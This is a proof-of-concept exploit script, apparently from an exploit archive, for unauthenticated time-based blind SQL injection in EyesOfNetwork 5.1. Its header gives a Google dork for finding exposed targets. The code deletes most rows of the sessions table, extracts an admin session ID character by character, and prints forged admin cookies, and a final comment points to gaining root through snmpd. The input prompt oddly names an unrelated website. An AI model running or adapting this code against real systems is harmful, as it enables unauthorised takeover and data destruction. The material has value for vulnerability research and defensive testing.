# Exploit Title: EyesOfNetwork (EON) 5.1 Unauthenticated SQL Injection in eonweb leading to remote root
# Google Dork: intitle:EyesOfNetwork intext:"sponsored by AXIANS"
# Date: 29/03/2017
# Exploit Author: Dany Bach
# Vendor Homepage: https://www.eyesofnetwork.com/
# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.1-x86_64-bin.iso
# Version: EyesOfNetwork <= 5.1
# Tested on: EyesOfNetwork 5.1 and 5.0
# CVE: None
# Contact: Dany Bach [@ddxhunter, rioru.github.io]
# Advisory and description of the complete scenario: https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html
# Fix: None

import time
from requests import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning

packages.urllib3.disable_warnings(InsecureRequestWarning)

url = raw_input("enter https://tweakers.net/?id= : ")

print "[!] Proof of Concept for the Unauthenticated SQL Injection in EyesOfNetwork 5.1 (DELETE statement) - Rioru (@ddxhunter)"

def getTime(page, cookie=""):
	start = time.time()
	get(url+page, verify=False, cookies=dict(session_id=cookie))
	end = time.time()
	return round(end - start, 2)

# Getting an initial response time to base our next requests around it
initial_time = getTime("/") + 5.01
getTime("rioru' OR user_id!=1 -- -")
print "[+] The initial request time on %s is %f, getting the number of entries, it could take a while..." % (url, initial_time)
sleep1_time = getTime("rioru' OR SLEEP(1)=1337 -- -")
if (sleep1_time - initial_time >= 1):
	count = round(sleep1_time)
	print "[+] Found %d entries in the [sessions] table, deleting every sessions except one" % count
else:
	print "[-] The table [sessions] seems empty"
	exit()

for i in range(int(count) - 1):
	getTime("rioru' OR 1=1 LIMIT 1 -- -")

# Get the length
session_length = 0
for i in range(12):
	execTime = getTime( "rioru' OR (SELECT CASE WHEN ((SELECT LENGTH(session_id) FROM DUAL ORDER BY session_id LIMIT 1)="+ str(i+1) +") THEN SLEEP(1) ELSE 1 END)=1337 -- -")
	if (round(execTime - initial_time) >= 1):
		session_length = i+1
		break
if (session_length == 0):
	print "[-] Couldn't find the length of the session_id"
	exit()
print "[+] Found an admin session length: %d, getting the session_id" % session_length

# Get the session_id
print "[+] session_id: ",
session_id = ""
for i in range(session_length):
	for j in range(10):
		execTime = getTime( "rioru' OR (SELECT CASE WHEN (SUBSTRING((SELECT session_id FROM DUAL ORDER BY session_id LIMIT 1),"+ str(i+1) +",1)="+ str(j) +") THEN SLEEP(1) ELSE 1 END)=1337 -- -")
		if (round(execTime - initial_time) >= 1):
			session_id += str(j)
			print str(j),
			break
print "\n[+] final session_id: [%s]" % session_id

# Get the username
execTime = getTime( "rioru' OR (SELECT CASE WHEN ((SELECT user_name FROM users WHERE user_id=1)='admin') THEN SLEEP(1) ELSE 1 END)=1337 -- -")
if (round(execTime - initial_time) >= 1):
	print "[+] Username is [admin]"
else:
	print "[-] Username is not admin, brute force necessary"

print "[+] End of the PoC use these cookies to authenticate to Eonweb:"
print "session_id: %s;" % session_id
print "user_name: %s;" % "admin"
print "user_id: %d;" % 1
print "user_limitation: %d;" % 0
print "group_id: %d;" % 1

# Root privileges can be gained using snmpd once authenticated
            
